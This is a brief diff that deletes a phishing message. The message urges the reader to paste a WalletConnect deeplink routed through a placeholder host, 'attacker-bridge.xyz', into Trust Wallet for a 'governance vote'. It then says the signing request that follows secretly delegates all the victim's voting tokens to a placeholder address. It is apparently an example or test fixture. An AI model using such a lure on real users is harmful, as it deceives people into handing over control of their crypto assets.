@@ -1,5 +1,0 @@
-Open Trust Wallet and paste this deeplink to connect for the governance vote:
-
-wc:1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d@1?bridge=https://attacker-bridge.xyz&key=1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef
-
-Once connected, you'll receive a signTypedData_v4 request for the governance proposal. The proposal secretly delegates all your voting tokens to 0xDeaDBeEf00000000000000000000000000000024 permanently.
